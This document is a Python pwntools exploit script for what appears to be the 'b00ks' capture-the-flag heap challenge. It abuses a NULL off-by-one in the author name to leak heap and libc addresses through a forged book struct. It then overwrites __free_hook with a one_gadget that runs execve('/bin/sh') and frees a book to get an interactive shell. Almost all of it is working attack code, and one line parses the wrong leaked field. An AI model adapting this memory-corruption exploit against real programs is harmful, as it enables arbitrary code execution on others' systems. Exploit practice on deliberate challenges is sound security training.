from pwn import *
import time

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]

REMOTE = 0

HOST = 'localhost'
PORT = 1337

PATH = './b00ks'
LIBC_PATH = './libc-2.27.so'

if(REMOTE):
    r = remote(HOST, PORT)
else:
    r = process(PATH, env={'LD_PRELOAD':LIBC_PATH})

def pad(addr):
    return 0 if (len(addr) > 8) else addr + '\x00'*(8-len(addr))
    
def give_author(name):
    r.recvuntil('author name: ')
    r.sendline(name)

def create_book(name_size, name, desc_size, description):
    r.recvuntil('> ')
    r.sendline('1')
    r.recvuntil('name size: ')
    r.sendline(str(name_size))
    r.recvuntil('chars): ')
    r.sendline(name)
    r.recvuntil('description size: ')
    r.sendline(str(desc_size))
    r.recvuntil('book description: ')
    r.sendline(description)

def delete_book(book_id):
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('to delete: ')
    r.sendline(str(book_id))
    
def edit_book(book_id, new_desc):
    r.recvuntil('> ')
    time.sleep(0.3)
    r.sendline('3')
    r.recvuntil('to edit: ')
    time.sleep(0.3)
    r.sendline(str(int(book_id)))
    time.sleep(0.3)
    r.recvuntil('description: ')
    r.sendline(new_desc)
    
def print_books():
    r.recvuntil('> ')
    r.sendline('4')
    return r.recvuntil('\n1. ')[:-4]


def print_book(book_id):
    r.recvuntil('> ')
    r.sendline('4')
    content = r.recvuntil('\n1. ')[:-4]

    content = content.split('ID: ')
    content.pop(0)

    return next((f'ID: {i}' for i in content if (i[0] == str(book_id))), 0)
    
def change_author(name):
    r.recvuntil('> ')
    r.sendline('5')
    r.recvuntil('author name: ')
    r.sendline(name)

def exit():
    r.recvuntil('> ')
    r.sendline('6')
    
    
def heap_leak():
    give_author('A'*32)                                                 # NULL Off-By-One
    create_book(128, 'AAAA', 32, 'AAAA')                                # Now as one chunk is created NULL will be overwritten, now we can leak
    create_book(0x30000, "a", 0x30000, "b")                             # We create huge chunks to make them being allocated separately through mmap (fixed libc offset)
    books = print_books()                                               # print book (as the author has no NULL, the address will be leaked)
    books = books.split('\n')                                           # find address in data received

    for i in books:
        if('Author:' in i):
            l = i.replace('Author: ', '')
            leak = l[-6:]
            break

    leak = pad(leak)                                                    # We leak the heap address of book 1
    return u64(leak)

'''
struct book {
    int id;
    char *name;
    char *description;
    int size;
}
'''

def libc_leak(func, leak_h):

    fake_struct = flat(                                                 # struct book {
                       p64(1),                                          #   int id;
                       p64(leak_h + 0x38),                              #   char *name;
                       p64(leak_h + 0x40),                              #   char *description;
                       p64(20)                                          #   int size;
                  )                                                     # }

    edit_book(1, fake_struct)                                           # We enter fake struct in book 1's description

    change_author('A'*32)                                               # Now the NULL off-by-one will make NULL last byte of address, pointing it to book 1's description

    content = print_book(1)                                             # We print it to get the address of mmaped chunk (it has fixed offset with glibc)

    name_addr = (content.split('Name: '))[1].split('\n')[0]
    desc_addr = (content.split('Description: '))[1].split('\n')[0]

    leak_n_addr = u64(pad(name_addr))
    leak_d_addr = u64(pad(name_addr))

    log.info(f'Leaked: mmaped chunk @ {hex(leak_d_addr)}')

    leak_mmap = leak_d_addr

    libc_base = leak_mmap - 0x5f1010                                    # libc base leaked

    log.info(f'Leaked: libc base @ {hex(libc_base)}')

    libc = ELF(LIBC_PATH, checksec=False)
    func_off = libc.symbols[func]

    leak_func = libc_base + func_off

    free_hook = libc_base + libc.symbols["__free_hook"]

    one_gadget = libc_base + 0xe926b

    return leak_func, free_hook, one_gadget

'''
0xcb79a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcb79d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcb7a0 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0xe926b execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL

'''

def rce(func, f_hook, arg, one_gadget):

    if (one_gadget != 0):
        edit_book(1, p64(f_hook) * 2)                                    # We change ptr content to free_hook
        edit_book(2, p64(one_gadget))                                    # Now we write one_gadget onto it
    else:
        edit_book(1, p64(f_hook) * 2)                                    # We change ptr content to free_hook
        edit_book(2, p64(func))                                          # We change ptr content to free_hook
    delete_book(2)                                                   # We free to call one_gadget
    r.interactive()

#if(not REMOTE):   
#    gdb.attach(r)
#    pause()

FUNC = 'system'
ARG = '/bin/sh\x00'

leak_h = heap_leak()

log.info(f'Leaked: heap address @ {hex(leak_h)}')

leak_l, free_hook, one_gadget = libc_leak(FUNC, leak_h)

log.info(f'Leaked: {FUNC} address @ {hex(leak_l)}')
log.info(f'Leaked: __free_hook address @ {hex(free_hook)}')

#one_gadget = 0

pause()

rce(leak_l, free_hook, ARG, one_gadget)

r.close()
